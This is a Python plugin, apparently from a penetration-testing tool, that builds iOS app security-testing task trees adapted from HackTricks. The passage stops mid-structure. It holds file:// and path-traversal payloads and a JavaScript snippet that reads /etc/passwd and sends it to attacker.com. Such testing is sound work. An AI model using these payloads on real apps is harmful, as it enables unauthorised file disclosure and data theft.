"""
iOS App Analysis Plugin

Generates tasks for iOS application security testing including:
- App Extensions (Custom Keyboards, Share Extensions, Widgets)
- WebView Security (UIWebView, WKWebView, SFSafariViewController)
- Serialization/Encoding (NSCoding, NSSecureCoding, Codable)
- Entitlements Extraction (from compiled binaries)

Extracted from HackTricks:
- ios-app-extensions.md
- ios-webviews.md
- ios-serialisation-and-encoding.md
- extracting-entitlements-from-compiled-application.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class iOSAppAnalysisPlugin(ServicePlugin):
    """iOS application analysis and security testing plugin"""

    @property
    def name(self) -> str:
        return "ios-app-analysis"

    @property
    def default_ports(self) -> List[int]:
        # iOS testing typically over SSH (22) or USB forwarding
        return [22, 62078]  # SSH and usbmuxd default

    @property
    def service_names(self) -> List[str]:
        return ['ios', 'ios-app', 'mobile', 'iphone', 'ipad']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect iOS analysis opportunities"""
        service = port_info.get('service', '').lower()
        version = port_info.get('version', '').lower()
        product = port_info.get('product', '').lower()

        # Check for iOS-specific indicators
        ios_indicators = [
            'ios' in service,
            'iphone' in service,
            'ipad' in service,
            'darwin' in version,
            'ios' in version,
            'mobile' in service
        ]

        return any(ios_indicators)

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate iOS app analysis task tree"""

        tasks = {
            'id': f'ios-app-analysis-{port}',
            'name': f'iOS App Analysis (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Add all analysis sections
        tasks['children'].extend([
            self._get_app_extensions_tasks(target, port),
            self._get_webview_analysis_tasks(target, port),
            self._get_serialization_tasks(target, port),
            self._get_entitlements_tasks(target, port),
            self._get_static_analysis_tasks(target, port),
            self._get_dynamic_analysis_tasks(target, port)
        ])

        return tasks

    def _get_app_extensions_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """App Extensions security testing"""
        return {
            'id': f'app-extensions-{port}',
            'name': 'App Extensions Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'identify-extensions-{port}',
                    'name': 'Identify App Extensions',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-appex-files-{port}',
                            'name': 'Find .appex Files in Bundle',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "find /var/containers/Bundle/Application -name \'*.appex\' -type d"',
                                'description': 'Locate app extension bundles in installed applications',
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                                'flag_explanations': {
                                    'find': 'Search filesystem for files/directories',
                                    '-name \'*.appex\'': 'Match extension bundle names',
                                    '-type d': 'Only directories (extensions are bundles)'
                                },
                                'success_indicators': [
                                    'List of .appex directories returned',
                                    'Extension types identified (keyboard, share, widget)'
                                ],
                                'failure_indicators': [
                                    'No extensions found (app may not use extensions)',
                                    'Permission denied (requires jailbreak)'
                                ],
                                'next_steps': [
                                    'Extract extension Info.plist files',
                                    'Identify NSExtensionPointIdentifier values',
                                    'Check for sensitive data sharing'
                                ],
                                'alternatives': [
                                    'Manual: Use Finder/iFunBox to browse app bundle',
                                    'Xcode: Check project for extension targets',
                                    'grep -r NSExtensionPointIdentifier /path/to/app'
                                ],
                                'notes': 'Common extension types: com.apple.keyboard-service (Custom Keyboard), com.apple.share-services (Share), com.apple.widget-extension (Today Widget)'
                            }
                        },
                        {
                            'id': f'grep-extension-id-{port}',
                            'name': 'Search for NSExtensionPointIdentifier',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "grep -r NSExtensionPointIdentifier /var/containers/Bundle/Application/*/Info.plist"',
                                'description': 'Find extension declarations in app metadata',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    '-r': 'Recursive search through directories',
                                    'NSExtensionPointIdentifier': 'Key indicating extension type'
                                },
                                'success_indicators': [
                                    'Extension identifiers found',
                                    'Info.plist files containing extension configs'
                                ],
                                'failure_indicators': [
                                    'No matches (app may not have extensions)',
                                    'Binary plist format (requires plutil conversion)'
                                ],
                                'next_steps': [
                                    'Convert binary plists: plutil -convert xml1 Info.plist',
                                    'Analyze NSExtensionActivationRule for data types',
                                    'Check for App Groups configuration'
                                ],
                                'alternatives': [
                                    'Manual: strings Info.plist | grep Extension',
                                    'rabin2 -zz AppBinary | grep NSExtension',
                                    'Open in text editor if XML format'
                                ],
                                'notes': 'Requires jailbroken device or decrypted IPA'
                            }
                        },
                        {
                            'id': f'extract-extension-plist-{port}',
                            'name': 'Extract Extension Info.plist',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "plutil -convert xml1 -o - /path/to/Extension.appex/Info.plist"',
                                'description': 'Convert binary plist to readable XML format',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'plutil': 'Property list utility (built into macOS/iOS)',
                                    '-convert xml1': 'Convert to XML format (human readable)',
                                    '-o -': 'Output to stdout instead of file'
                                },
                                'success_indicators': [
                                    'XML plist output displayed',
                                    'NSExtension dictionary visible',
                                    'NSExtensionPointIdentifier shown'
                                ],
                                'failure_indicators': [
                                    'File not found (wrong path)',
                                    'Already XML format (no conversion needed)',
                                    'Malformed plist'
                                ],
                                'next_steps': [
                                    'Identify NSExtensionActivationRule (supported data types)',
                                    'Check for App Groups entitlement',
                                    'Review NSExtensionAttributes for security configs'
                                ],
                                'alternatives': [
                                    'Manual: cat Info.plist (if already XML)',
                                    'plistutil -i Info.plist',
                                    'Copy to Mac and open in Xcode'
                                ],
                                'notes': 'Focus on NSExtensionActivationRule - defines which data types trigger extension (security boundary)'
                            }
                        }
                    ]
                },
                {
                    'id': f'analyze-data-sharing-{port}',
                    'name': 'Analyze Extension Data Sharing',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'check-app-groups-{port}',
                            'name': 'Check App Groups Configuration',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "grep -A 5 \'com.apple.security.application-groups\' /path/to/App.app/embedded.mobileprovision"',
                                'description': 'Identify shared container configuration between app and extensions',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    '-A 5': 'Show 5 lines after match (context)',
                                    'com.apple.security.application-groups': 'Entitlement for shared containers'
                                },
                                'success_indicators': [
                                    'App group identifiers found (group.com.company.app)',
                                    'Multiple extensions sharing same group',
                                    'Shared container path identified'
                                ],
                                'failure_indicators': [
                                    'No app groups found (extensions isolated)',
                                    'Binary mobileprovision (needs security cms -D)',
                                    'File not found'
                                ],
                                'next_steps': [
                                    'Locate shared container: /var/mobile/Containers/Shared/AppGroup/',
                                    'Check for sensitive data in shared UserDefaults',
                                    'Review shared database files (SQLite)'
                                ],
                                'alternatives': [
                                    'security cms -D -i embedded.mobileprovision',
                                    'grep ApplicationGroups App.entitlements',
                                    'Check NSUserDefaults(suiteName:) in source code'
                                ],
                                'notes': 'App Groups allow extensions and main app to share data - check for sensitive info leakage'
                            }
                        },
                        {
                            'id': f'inspect-shared-container-{port}',
                            'name': 'Inspect Shared Container',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "ls -la /var/mobile/Containers/Shared/AppGroup/<GROUP_ID>/"',
                                'description': 'List files in shared container accessible by extensions',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'flag_explanations': {
                                    'ls -la': 'List all files with permissions',
                                    '/var/mobile/Containers/Shared/AppGroup/': 'Shared container base path'
                                },
                                'success_indicators': [
                                    'Shared files listed',
                                    'UserDefaults plist files visible',
                                    'Database files found'
                                ],
                                'failure_indicators': [
                                    'Directory not found (wrong group ID)',
                                    'Empty directory (no data sharing)',
                                    'Permission denied'
                                ],
                                'next_steps': [
                                    'Extract sensitive files: scp root@{target}:/path/to/file .',
                                    'Analyze UserDefaults for credentials',
                                    'Check SQLite databases for PII'
                                ],
                                'alternatives': [
                                    'Manual: Use iFunBox to browse shared containers',
                                    'Frida: ObjC.choose() to find NSUserDefaults instances',
                                    'Objection: ios nsuserdefaults get'
                                ],
                                'notes': 'Focus on: Library/Preferences/*.plist (UserDefaults), Documents/, Library/Caches/'
                            }
                        },
                        {
                            'id': f'hook-shared-items-{port}',
                            'name': 'Hook NSExtensionContext inputItems',
                            'type': 'command',
                            'metadata': {
                                'command': f'frida -U -n Extension -l hook_extension_input.js',
                                'description': 'Monitor data passed from host app to extension',
                                'tags': ['OSCP:MEDIUM', 'DYNAMIC'],
                                'flag_explanations': {
                                    '-U': 'Connect to USB device',
                                    '-n Extension': 'Attach to extension process by name',
                                    '-l': 'Load JavaScript hook script'
                                },
                                'success_indicators': [
                                    'Frida attached successfully',
                                    'inputItems logged to console',
                                    'Data types and origins visible'
                                ],
                                'failure_indicators': [
                                    'Process not found (extension not running)',
                                    'Frida not installed',
                                    'App crash on hook'
                                ],
                                'next_steps': [
                                    'Analyze data types being shared',
                                    'Check for sensitive data in attachments',
                                    'Test with malicious input data'
                                ],
                                'alternatives': [
                                    'Manual: Use Xcode debugger on extension process',
                                    'Cycript: [NSExtensionContext inputItems]',
                                    'Log statements in extension source code'
                                ],
                                'notes': 'Hook script: ObjC.classes.NSExtensionContext["- inputItems"].implementation = function() { var items = this.inputItems(); console.log(items); return items; }'
                            }
                        }
                    ]
                },
                {
                    'id': f'test-extension-restrictions-{port}',
                    'name': 'Test Extension Restrictions',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'check-keyboard-restrictions-{port}',
                            'name': 'Check Custom Keyboard Restrictions',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Test if app properly restricts custom keyboards on sensitive fields',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'next_steps': [
                                    '1. Open target app on iOS device',
                                    '2. Navigate to password/sensitive input field',
                                    '3. Tap field and check keyboard picker',
                                    '4. Verify custom keyboards are disabled',
                                    '5. Check for UITextInputTraits.keyboardType = .default'
                                ],
                                'success_indicators': [
                                    'Only system keyboard available on sensitive fields',
                                    'No third-party keyboards in picker',
                                    'textField.textContentType set appropriately'
                                ],
                                'failure_indicators': [
                                    'Custom keyboards allowed on password fields',
                                    'No keyboard restrictions visible',
                                    'Sensitive data accessible to extensions'
                                ],
                                'alternatives': [
                                    'Source code review: search for resignFirstResponder',
                                    'Frida: Hook UITextField/UITextView initialization',
                                    'Check UITextInputTraits properties'
                                ],
                                'notes': 'Apps should set textField.textContentType = .password to restrict keyboards. Custom keyboards have network access!'
                            }
                        },
                        {
                            'id': f'test-widget-permissions-{port}',
                            'name': 'Test Today Widget Permissions',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Verify Today Widget cannot access restricted APIs',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'next_steps': [
                                    '1. Add app widget to Today view',
                                    '2. Trigger widget actions',
                                    '3. Monitor for restricted API calls (camera, HealthKit)',
                                    '4. Test openURL functionality',
                                    '5. Verify widget cannot start long-running tasks'
                                ],
                                'success_indicators': [
                                    'Restricted APIs properly blocked',
                                    'openURL only opens main app',
                                    'No background tasks initiated'
                                ],
                                'failure_indicators': [
                                    'Widget accessing camera/microphone',
                                    'HealthKit data accessible from widget',
                                    'Long-running tasks executing'
                                ],
                                'alternatives': [
                                    'Source review: Check for AVFoundation imports in widget',
                                    'Runtime analysis: Monitor system calls',
                                    'Frida: Hook restricted framework methods'
                                ],
                                'notes': 'Widgets cannot use: HealthKit, HomeKit, camera, microphone, long-running background tasks (except iMessage extensions)'
                            }
                        }
                    ]
                },
                {
                    'id': f'dynamic-extension-analysis-{port}',
                    'name': 'Dynamic Extension Analysis',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'frida-trace-extension-{port}',
                            'name': 'Frida Trace Extension IPC',
                            'type': 'command',
                            'metadata': {
                                'command': f'frida-trace -U -n Extension -m "*[NSXPCConnection *]"',
                                'description': 'Monitor inter-process communication between app and extension',
                                'tags': ['OSCP:MEDIUM', 'DYNAMIC'],
                                'flag_explanations': {
                                    'frida-trace': 'Automatic method tracing utility',
                                    '-U': 'Connect to USB device',
                                    '-n Extension': 'Target extension process',
                                    '-m "*[NSXPCConnection *]"': 'Trace all NSXPCConnection methods (IPC mechanism)'
                                },
                                'success_indicators': [
                                    'NSXPCConnection methods logged',
                                    'IPC messages between app and extension visible',
                                    'Data serialization captured'
                                ],
                                'failure_indicators': [
                                    'No matches found (extension may not use XPC)',
                                    'Too much output (need to narrow pattern)',
                                    'Extension not running'
                                ],
                                'next_steps': [
                                    'Identify XPC service endpoints',
                                    'Analyze message payloads for sensitive data',
                                    'Test for message injection vulnerabilities'
                                ],
                                'alternatives': [
                                    'Manual: Use Console.app to view system logs',
                                    'dtrace: Monitor XPC traffic',
                                    'Frida custom script for NSXPCConnection hooks'
                                ],
                                'notes': 'Extensions communicate via XPC, not direct memory access. Look for NSSecureCoding serialization of objects.'
                            }
                        },
                        {
                            'id': f'objection-extension-{port}',
                            'name': 'Objection Extension Exploration',
                            'type': 'command',
                            'metadata': {
                                'command': f'objection -g Extension explore',
                                'description': 'Interactive exploration of extension runtime',
                                'tags': ['OSCP:MEDIUM', 'DYNAMIC'],
                                'flag_explanations': {
                                    '-g Extension': 'Gadget/attach to extension process',
                                    'explore': 'Start interactive REPL'
                                },
                                'success_indicators': [
                                    'Objection REPL started',
                                    'Extension classes enumerated',
                                    'Runtime manipulation possible'
                                ],
                                'failure_indicators': [
                                    'Extension process not found',
                                    'Objection not installed',
                                    'Anti-tampering detection triggered'
                                ],
                                'next_steps': [
                                    'ios info binary - Get extension binary info',
                                    'ios hooking list classes - List extension classes',
                                    'ios nsuserdefaults get - Dump shared preferences',
                                    'ios cookies get - Check for cookies'
                                ],
                                'alternatives': [
                                    'Cycript: cycript -p Extension',
                                    'Frida: frida -U -n Extension',
                                    'lldb: debugserver *:1234 -a Extension'
                                ],
                                'notes': 'Useful Objection commands: ios hooking watch method, ios keychain dump, ios plist cat'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_webview_analysis_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """WebView security analysis tasks"""
        return {
            'id': f'webview-analysis-{port}',
            'name': 'WebView Security Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'identify-webview-types-{port}',
                    'name': 'Identify WebView Types',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-uiwebview-{port}',
                            'name': 'Find UIWebView Usage (Deprecated)',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | egrep "UIWebView$"',
                                'description': 'Detect deprecated UIWebView (vulnerable to JS injection, no XSS protection)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'VULN'],
                                'flag_explanations': {
                                    'rabin2': 'Binary analysis tool (part of radare2)',
                                    '-zz': 'Extract all strings from binary (including data sections)',
                                    'egrep "UIWebView$"': 'Match class name at end of line'
                                },
                                'success_indicators': [
                                    'UIWebView class references found',
                                    'String offsets displayed',
                                    'Initialization methods present'
                                ],
                                'failure_indicators': [
                                    'No matches (app likely uses WKWebView)',
                                    'Binary encrypted (need to decrypt first)',
                                    'rabin2 not installed'
                                ],
                                'next_steps': [
                                    'Report as vulnerability (UIWebView deprecated iOS 12+)',
                                    'Check for JavaScript enablement (cannot be disabled)',
                                    'Test for XSS via loadHTMLString'
                                ],
                                'alternatives': [
                                    'Manual: strings AppBinary | grep UIWebView',
                                    'class-dump: class-dump AppBinary | grep UIWebView',
                                    'Source review: grep -r UIWebView *.m'
                                ],
                                'notes': 'UIWebView is CRITICAL VULN - JavaScript cannot be disabled, vulnerable to XSS. Apple rejects apps using it since iOS 12.'
                            }
                        },
                        {
                            'id': f'find-wkwebview-{port}',
                            'name': 'Find WKWebView Usage',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | egrep "WKWebView$"',
                                'description': 'Detect modern WKWebView implementation (preferred)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'rabin2 -zz': 'Extract all strings including data sections',
                                    'egrep "WKWebView$"': 'Match WKWebView class name'
                                },
                                'success_indicators': [
                                    'WKWebView references found',
                                    'Modern WebKit usage confirmed',
                                    'Secure WebView implementation'
                                ],
                                'failure_indicators': [
                                    'No matches (check for SFSafariViewController or UIWebView)',
                                    'Binary encrypted',
                                    'Only UIWebView found (security concern)'
                                ],
                                'next_steps': [
                                    'Check JavaScript enablement: grep javaScriptEnabled',
                                    'Verify allowFileAccessFromFileURLs is false',
                                    'Test hasOnlySecureContent property'
                                ],
                                'alternatives': [
                                    'rabin2 -zzq AppBinary | egrep "WKWebView.*frame"',
                                    'nm AppBinary | grep WKWebView',
                                    'class-dump and search for WKWebView references'
                                ],
                                'notes': 'WKWebView is secure by default but check configuration. Runs in separate process (no memory corruption risk to main app).'
                            }
                        },
                        {
                            'id': f'find-sfsafari-{port}',
                            'name': 'Find SFSafariViewController',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | egrep "SFSafariViewController"',
                                'description': 'Detect Safari view controller usage (most secure option)',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'SFSafariViewController': 'Full Safari browser in-app (shares cookies with Safari)'
                                },
                                'success_indicators': [
                                    'SFSafariViewController found',
                                    'App using full Safari experience',
                                    'Read-only address bar present'
                                ],
                                'failure_indicators': [
                                    'No matches',
                                    'App using custom WebView instead'
                                ],
                                'next_steps': [
                                    'Verify proper usage (must be full-screen per App Store guidelines)',
                                    'Check if used for authentication flows',
                                    'Test cookie sharing with Safari'
                                ],
                                'alternatives': [
                                    'Dynamic: Check UI hierarchy at runtime',
                                    'Source: grep -r SFSafariViewController',
                                    'Runtime: ObjC.choose(ObjC.classes.SFSafariViewController)'
                                ],
                                'notes': 'SFSafariViewController = most secure (JavaScript cannot be disabled, shares Safari cookies, app cannot access content). Must be displayed full-screen per Apple guidelines.'
                            }
                        }
                    ]
                },
                {
                    'id': f'check-webview-config-{port}',
                    'name': 'Check WebView Configurations',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'check-js-enabled-{port}',
                            'name': 'Check JavaScript Enablement',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "javascriptenabled"',
                                'description': 'Verify if JavaScript is disabled in WKWebView (best practice)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'grep -i': 'Case-insensitive search',
                                    'javascriptenabled': 'WKPreferences property controlling JS'
                                },
                                'success_indicators': [
                                    'javaScriptEnabled = NO found',
                                    'JavaScript properly disabled',
                                    'Secure configuration confirmed'
                                ],
                                'failure_indicators': [
                                    'javaScriptEnabled = YES found (potential risk)',
                                    'No explicit setting (defaults to YES)',
                                    'String not found in binary'
                                ],
                                'next_steps': [
                                    'If JS enabled: Test for XSS vulnerabilities',
                                    'Check if JS is required for app functionality',
                                    'Review JavaScript bridge implementations'
                                ],
                                'alternatives': [
                                    'Dynamic: Frida hook WKPreferences.javaScriptEnabled',
                                    'Source: grep -r "javaScriptEnabled.*NO" *.swift',
                                    'Runtime: wkWebView.configuration().preferences().javaScriptEnabled()'
                                ],
                                'notes': 'Best practice: Disable JavaScript unless required. If needed, validate all content and use strict CSP.'
                            }
                        },
                        {
                            'id': f'check-secure-content-{port}',
                            'name': 'Check hasOnlySecureContent',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "hasonlysecurecontent"',
                                'description': 'Verify app checks for mixed content (HTTP resources in HTTPS pages)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'hasonlysecurecontent': 'WKWebView property indicating all content loaded over HTTPS'
                                },
                                'success_indicators': [
                                    'hasOnlySecureContent checks found',
                                    'App validates secure connections',
                                    'Mixed content detection implemented'
                                ],
                                'failure_indicators': [
                                    'Property not used (no mixed content detection)',
                                    'No HTTPS enforcement',
                                    'HTTP resources allowed'
                                ],
                                'next_steps': [
                                    'Test with HTTP page loading HTTPS resources',
                                    'Check ATS (App Transport Security) configuration',
                                    'Test for SSL pinning on WebView requests'
                                ],
                                'alternatives': [
                                    'Dynamic: wkWebView.hasOnlySecureContent() check',
                                    'Source: grep -r hasOnlySecureContent',
                                    'Frida: Hook WKWebView and log property'
                                ],
                                'notes': 'WKWebView exclusive feature (UIWebView cannot detect mixed content). Returns true only if ALL page resources loaded via HTTPS.'
                            }
                        },
                        {
                            'id': f'check-file-access-{port}',
                            'name': 'Check File URL Access Settings',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "allowFileAccessFromFileURLs\\|allowUniversalAccessFromFileURLs"',
                                'description': 'Check if WebView allows file:// URL access (potential local file disclosure)',
                                'tags': ['OSCP:HIGH', 'VULN'],
                                'flag_explanations': {
                                    'allowFileAccessFromFileURLs': 'Allow file:// URLs to access other local files',
                                    'allowUniversalAccessFromFileURLs': 'Allow file:// URLs to access any origin',
                                    '\\|': 'OR operator in grep (search for either string)'
                                },
                                'success_indicators': [
                                    'Properties found set to false/NO',
                                    'File access properly restricted',
                                    'Secure WebView configuration'
                                ],
                                'failure_indicators': [
                                    'Properties set to true/YES (HIGH RISK)',
                                    'Properties not configured (defaults vary)',
                                    'No string found (check runtime)'
                                ],
                                'next_steps': [
                                    'If enabled: Test local file exfiltration via JS',
                                    'Craft file:// URL payloads',
                                    'Check if loadFileURL: is used'
                                ],
                                'alternatives': [
                                    'Dynamic Frida hook: wkWebView.configuration().preferences().valueForKey_("allowFileAccessFromFileURLs")',
                                    'Source review: Check WKWebViewConfiguration',
                                    'Runtime inspection with ObjC.choose()'
                                ],
                                'notes': 'CRITICAL: If allowUniversalAccessFromFileURLs=true, JS can read ANY file accessible to app (file:///etc/passwd). UIWebView allows by default!'
                            }
                        }
                    ]
                },
                {
                    'id': f'test-webview-protocol-handlers-{port}',
                    'name': 'Test WebView Protocol Handlers',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-load-methods-{port}',
                            'name': 'Find Content Loading Methods',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "loadHTMLString\\|loadData\\|loadRequest\\|loadFileURL"',
                                'description': 'Identify how WebView loads content (local vs remote)',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    'loadHTMLString:baseURL:': 'Load HTML from string (check for injection)',
                                    'loadData:MIMEType:': 'Load data directly (check source)',
                                    'loadRequest:': 'Load remote URL (check validation)',
                                    'loadFileURL:allowingReadAccessToURL:': 'Load local file (check path traversal)'
                                },
                                'success_indicators': [
                                    'Content loading methods identified',
                                    'Local and remote loading patterns visible',
                                    'Potential injection points found'
                                ],
                                'failure_indicators': [
                                    'No matches (check obfuscation)',
                                    'Binary encrypted',
                                    'Methods called via runtime invocation'
                                ],
                                'next_steps': [
                                    'Hook methods to see actual content loaded',
                                    'Test for injection in loadHTMLString',
                                    'Check if user input influences file paths',
                                    'Test loadFileURL with ../ path traversal'
                                ],
                                'alternatives': [
                                    'class-dump: Find method signatures',
                                    'Frida: Hook all WKWebView load methods',
                                    'Source: grep for WKWebView method calls'
                                ],
                                'notes': 'loadFileURL:allowingReadAccessToURL: - If second param is directory, entire directory readable! Always use specific file URL.'
                            }
                        },
                        {
                            'id': f'test-local-file-loading-{port}',
                            'name': 'Test Local File Loading',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Test for local file disclosure via WebView file:// protocol',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'VULN'],
                                'next_steps': [
                                    '1. Identify WebView loading user-controllable URLs',
                                    '2. Test payload: file:///etc/passwd',
                                    '3. Test payload: file:///var/mobile/Containers/Data/Application/',
                                    '4. Test path traversal: file://../../../etc/passwd',
                                    '5. Check if content is displayed or exfiltrable'
                                ],
                                'success_indicators': [
                                    'Local file contents displayed in WebView',
                                    'File system accessible via file:// URLs',
                                    'Sensitive data readable'
                                ],
                                'failure_indicators': [
                                    'File access blocked (proper configuration)',
                                    'User input sanitized',
                                    'allowFileAccessFromFileURLs = false'
                                ],
                                'alternatives': [
                                    'Burp Suite: Intercept and modify WebView requests',
                                    'Frida: Inject file:// URLs via hook',
                                    'JavaScript payload via XSS (if JS enabled)'
                                ],
                                'notes': 'JavaScript payload for exfiltration: var xhr = new XMLHttpRequest(); xhr.open("GET", "file:///etc/passwd"); xhr.onload = function() { fetch("http://attacker.com/?data=" + btoa(xhr.responseText)); }; xhr.send();'
                            }
                        },
                        {
                            'id': f'test-protocol-handlers-{port}',
                            'name': 'Test Custom Protocol Handlers',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Test handling of custom URL schemes (tel://, sms://, app-scheme://)',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'next_steps': [
                                    '1. Load WebView with custom scheme: tel://123456789',
                                    '2. Test app-specific schemes: myapp://action',
                                    '3. Test sms:// and mailto:// schemes',
                                    '4. Check for validation of scheme parameters',
                                    '5. Test for open redirect via custom schemes'
                                ],
                                'success_indicators': [
                                    'Schemes properly validated before handling',
                                    'Confirmation dialogs shown for sensitive actions',
                                    'No arbitrary code execution via schemes'
                                ],
                                'failure_indicators': [
                                    'Custom schemes trigger without validation',
                                    'Arbitrary URLs opened',
                                    'No user confirmation for sensitive actions (tel://, sms://)'
                                ],
                                'alternatives': [
                                    'Frida: Hook UIApplication openURL:',
                                    'Source: Check WKNavigationDelegate methods',
                                    'Burp: Inject schemes into WebView content'
                                ],
                                'notes': 'Check decidePolicyForNavigationAction delegate method for scheme validation. Test: <a href="tel://1234567890">Call</a>'
                            }
                        }
                    ]
                },
                {
                    'id': f'analyze-js-bridge-{port}',
                    'name': 'Analyze JavaScript Bridge',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-jscontext-{port}',
                            'name': 'Find JSContext Usage (UIWebView)',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "JSContext\\|JSExport\\|evaluateScript"',
                                'description': 'Detect JavaScript-to-native bridge via JSContext (UIWebView)',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    'JSContext': 'JavaScript execution context (iOS 7+)',
                                    'JSExport': 'Protocol to expose native objects to JS',
                                    'evaluateScript': 'Execute JavaScript from native code'
                                },
                                'success_indicators': [
                                    'JSContext references found',
                                    'Native-to-JS bridge identified',
                                    'Exposed native methods detected'
                                ],
                                'failure_indicators': [
                                    'No matches (may use WKWebView postMessage instead)',
                                    'Bridge not implemented',
                                    'Binary obfuscated'
                                ],
                                'next_steps': [
                                    'Hook JSContext to see exposed objects',
                                    'Find JSExport protocol conforming classes',
                                    'Test calling native methods from JavaScript',
                                    'Check for sensitive operations exposed to JS'
                                ],
                                'alternatives': [
                                    'Source: grep -r "JSExport" *.swift',
                                    'class-dump: Find classes conforming to JSExport',
                                    'Runtime: [webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]'
                                ],
                                'notes': 'JSContext only for UIWebView. Access: [webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]. Check for sensitive methods exposed!'
                            }
                        },
                        {
                            'id': f'find-wk-message-handler-{port}',
                            'name': 'Find WKScriptMessageHandler',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "WKScriptMessageHandler\\|postMessage\\|userContentController"',
                                'description': 'Detect JavaScript-to-native bridge via postMessage (WKWebView)',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    'WKScriptMessageHandler': 'Protocol for receiving JS messages',
                                    'postMessage': 'JavaScript method to send messages to native',
                                    'userContentController': 'Manages message handlers'
                                },
                                'success_indicators': [
                                    'Message handler names identified',
                                    'JS bridge endpoints found',
                                    'Handler registration code visible'
                                ],
                                'failure_indicators': [
                                    'No message handlers (no JS bridge)',
                                    'UIWebView JSContext used instead',
                                    'Binary encrypted'
                                ],
                                'next_steps': [
                                    'Identify handler names: addScriptMessageHandler:name:',
                                    'Hook userContentController:didReceiveScriptMessage:',
                                    'Test calling handlers from JavaScript',
                                    'Analyze message validation'
                                ],
                                'alternatives': [
                                    'Source: Find WKScriptMessageHandler implementations',
                                    'Frida: ObjC.choose(ObjC.classes.WKUserContentController)',
                                    'class-dump: Search for message handler classes'
                                ],
                                'notes': 'WKWebView bridge: window.webkit.messageHandlers.HANDLER_NAME.postMessage(data). Much safer than JSContext (explicit message passing).'
                            }
                        },
                        {
                            'id': f'test-js-bridge-injection-{port}',
                            'name': 'Test JavaScript Bridge Injection',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Test for command injection via JavaScript bridge',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'VULN'],
                                'next_steps': [
                                    '1. Identify exposed native methods/handlers',
                                    '2. Test with malicious payloads',
                                    '3. JavaScript (WKWebView): window.webkit.messageHandlers.HANDLER.postMessage(["cmd", "arg1", "arg2"])',
                                    '4. JavaScript (UIWebView): exposedObject.method("malicious")',
                                    '5. Test for command injection, path traversal, etc.'
                                ],
                                'success_indicators': [
                                    'Input properly validated and sanitized',
                                    'No arbitrary code execution',
                                    'Sensitive operations require confirmation'
                                ],
                                'failure_indicators': [
                                    'Unvalidated input passed to native methods',
                                    'Command injection successful',
                                    'File system access via bridge',
                                    'No authentication on sensitive operations'
                                ],
                                'alternatives': [
                                    'Burp Suite: Intercept WebView content and inject JS',
                                    'Frida: Call handler directly from Frida',
                                    'Modified IPA: Inject malicious JS into HTML files'
                                ],
